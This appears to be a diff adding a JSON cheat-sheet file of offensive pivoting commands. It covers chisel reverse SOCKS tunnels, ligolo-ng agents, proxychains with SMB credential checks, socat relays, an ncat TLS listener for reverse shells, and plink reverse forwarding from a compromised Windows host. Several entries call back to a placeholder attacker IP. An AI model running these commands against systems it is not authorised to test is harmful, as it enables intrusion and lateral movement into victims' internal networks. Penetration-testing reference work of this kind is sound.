@@ -1,0 +1,89 @@
+[
+  {
+    "tool": "chisel",
+    "title": "Reverse SOCKS proxy",
+    "command": "# attacker\nchisel server -p 8000 --reverse\n# victim\nchisel client <attacker-ip>:8000 R:socks",
+    "description": "Tunnel into internal networks over a SOCKS proxy. Point proxychains at port 1080.",
+    "tags": [
+      "pivoting",
+      "tunnel",
+      "socks",
+      "proxy",
+      "lateral movement"
+    ],
+    "output": "A SOCKS5 proxy on the attacker at :1080 reaching the victim's internal network."
+  },
+  {
+    "tool": "ligolo-ng",
+    "title": "Interface-based pivot",
+    "command": "# attacker\nligolo-proxy -selfcert\n# agent\nagent -connect <attacker-ip>:11601 -ignore-cert",
+    "description": "Modern pivoting with a virtual interface, no proxychains, routes feel native.",
+    "tags": [
+      "pivoting",
+      "tunnel",
+      "lateral movement",
+      "ligolo"
+    ],
+    "output": "A tun interface you route internal subnets through and reach directly."
+  },
+  {
+    "tool": "proxychains",
+    "title": "Route tools through a SOCKS pivot",
+    "command": "proxychains4 nxc smb targets.txt -u <user> -p '<pass>' -d <domain>",
+    "description": "Forces any tool through a proxy chain. Add `socks5 127.0.0.1 1080` to the end of /etc/proxychains4.conf (e.g. a chisel R:socks tunnel), then prefix commands with proxychains4.",
+    "tags": [
+      "proxychains",
+      "pivoting",
+      "socks",
+      "proxy",
+      "tunnel",
+      "lateral movement"
+    ],
+    "output": "Your tool's traffic tunneled into the internal network via the SOCKS proxy."
+  },
+  {
+    "tool": "socat",
+    "title": "Port forward / relay",
+    "command": "socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80",
+    "description": "Glues two data streams together for port forwarding, relays and pivots. TCP-LISTEN:...,fork keeps accepting connections. Often already installed on Linux hosts.",
+    "tags": [
+      "socat",
+      "pivoting",
+      "port forward",
+      "relay",
+      "tunnel"
+    ],
+    "output": "Local :8080 transparently proxied to the internal host:port."
+  },
+  {
+    "tool": "ncat",
+    "title": "SSL listener for reverse shells",
+    "command": "ncat -vnlp 8443 --ssl-key key.pem --ssl-cert cert.pem",
+    "description": "Netcat's modern cousin with TLS, for targets that only accept encrypted callbacks. Generate a cert first: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 10 -nodes. Restrict callers with --allow <ip>.",
+    "tags": [
+      "ncat",
+      "ssl",
+      "tls",
+      "reverse shell",
+      "listener",
+      "pivoting"
+    ],
+    "output": "An encrypted listener on :8443 ready to catch a shell or connection."
+  },
+  {
+    "tool": "plink",
+    "title": "SSH tunneling from Windows",
+    "command": "plink.exe -R 4444:127.0.0.1:3389 <user>@<your-ip> -pw <pass>",
+    "description": "PuTTY's CLI SSH client for Windows. Great for reverse (-R) and local (-L) port forwards from a compromised Windows box, e.g. expose its RDP back to you.",
+    "tags": [
+      "plink",
+      "putty",
+      "ssh",
+      "tunnel",
+      "port forward",
+      "pivoting",
+      "windows"
+    ],
+    "output": "A forwarded port bridging your host and the target's internal service."
+  }
+]
